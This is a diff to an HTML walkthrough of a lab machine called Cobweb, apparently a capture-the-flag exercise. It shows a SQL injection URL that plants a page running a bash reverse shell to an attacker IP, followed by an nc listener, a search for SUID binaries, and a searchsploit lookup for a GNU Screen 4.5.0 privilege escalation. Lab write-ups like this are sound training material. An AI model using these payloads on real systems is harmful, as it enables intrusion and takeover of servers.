@@ -164,15 +164,72 @@ ftp&gt; exit
 100   917  100   917    0     0  10188      0 --:--:-- --:--:-- --:--:-- 10188
     </pre>
 
-    <li>I pasted this code into a php beautifier that I found on google to make it easier to read.</li>
+    <li>I pasted this code into a php beautifier that I found on google to make it easier to read.  I also added comments to the code to give a brief explanation of how we will exploit the code.</li>
 
     <img src="Cobweb/sql_injection.png">
 
-    <li>This code shows a SQL injection vulnerability in the url.  Also based off this code, we can see that sql is searching the url in one column and the data for the webpage we are searching is being pulled from the next column.  We will exploit this sql injection by inserting a new web page into the sql table containing a reverse shell.</li>
+    <li>I send this in through Firefox to create the reverse shell web page.</li>
     <ul>
-        <li>I send this in through Firefox: http://192.168.248.162/"; INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'system("bash -i >& /dev/tcp/192.168.49.248/4444 0>&1");');-- -</li>
-
-
+        <li>http://192.168.248.162/"; INSERT INTO webpages(route_string, page_data) VALUES ('/rev', 'system("bash -i >& /dev/tcp/192.168.49.248/4444 0>&1");');-- -</li>
     </ul>
+
+    <li>Once I have created the reverse shell webpage I start a reverse listener (nc -lvnp 4444) and then execute the code by visiting http://192.168.248.162/rev</li>
+    <ul>
+        <li>The reverse shell connects and I gain a shell as the user apache.</li>
+    </ul>
+
+    <h2>Getting root</h2>
+
+    <li>I search for all files that have the SUID bit set and the one that stands out is screens-4.5.0</li>
+
+    <pre>
+bash-4.4$ find / -perm -u=s 2&gt;/dev/null
+find / -perm -u=s 2&gt;/dev/null
+/var/tmp/rootshell
+/usr/bin/fusermount
+/usr/bin/chage
+/usr/bin/gpasswd
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/umount
+/usr/bin/pkexec
+/usr/bin/crontab
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/sudo
+/usr/bin/fusermount3
+/usr/bin/screen-4.5.0
+/usr/sbin/grub2-set-bootflag
+/usr/sbin/pam_timestamp_check
+/usr/sbin/unix_chkpwd
+/usr/sbin/userhelper
+/usr/lib/polkit-1/polkit-agent-helper-1
+/usr/libexec/dbus-1/dbus-daemon-launch-helper
+/usr/libexec/cockpit-session
+/usr/libexec/sssd/krb5_child
+/usr/libexec/sssd/ldap_child
+/usr/libexec/sssd/proxy_child
+/usr/libexec/sssd/selinux_child
+    </pre>
+
+    <li>We go to searchsploit and search for any exploits for it.  I also include the version 4.5</li>
+
+    <pre>
+&#x250c;&#x2500;&#x2500;(kali&#x327f;kali)-[~/Documents/ProvingGrounds/Cobweb]
+&#x2514;&#x2500;$ searchsploit screen 4.5
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                              |  Path
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+GNU Screen 4.5.0 - Local Privilege Escalation                                                                               | linux/local/41154.sh
+GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                         | linux/local/41152.txt
+---------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+    </pre>
+
+    
+
+
 
 
